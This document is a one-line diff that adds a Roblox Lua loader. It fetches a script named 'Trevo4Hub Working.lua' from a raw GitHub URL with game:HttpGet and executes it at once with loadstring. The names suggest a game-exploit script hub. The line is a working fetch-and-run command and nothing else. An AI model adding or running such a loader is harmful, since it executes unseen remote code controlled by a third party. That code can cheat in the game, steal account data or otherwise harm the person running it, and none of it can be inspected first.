@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Trev0rZ/Loader/main/Trevo4Hub%20Working.lua'),true))()
